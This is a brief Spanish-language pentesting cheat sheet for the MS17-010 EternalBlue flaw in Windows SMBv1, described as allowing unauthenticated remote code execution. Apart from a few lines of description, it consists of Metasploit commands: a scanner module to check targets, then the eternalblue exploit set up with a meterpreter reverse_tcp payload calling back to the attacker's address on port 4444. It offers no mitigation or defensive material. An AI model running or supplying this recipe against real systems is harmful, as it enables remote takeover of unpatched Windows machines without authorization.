Vulnerabilidad crítica en SMB que permite ejecución remota de código.

• Afecta a Windows (SMBv1)  
• No requiere autenticación  
• Muy usada en pentesting

## Escaneo MS17-010

Detecta si el objetivo es vulnerable a EternalBlue.

```
use auxiliary/scanner/smb/smb_ms17_010
```
	set RHOSTS IP  
	set RPORT 445

## Exploit EternalBlue

Explota la vulnerabilidad para obtener acceso remoto.

```
use exploit/windows/smb/ms17_010_eternalblue
```
	set RHOSTS IP  
	set RPORT 445  
	set PAYLOAD windows/x64/meterpreter/reverse_tcp  
	set LHOST TU_IP  
	set LPORT 4444
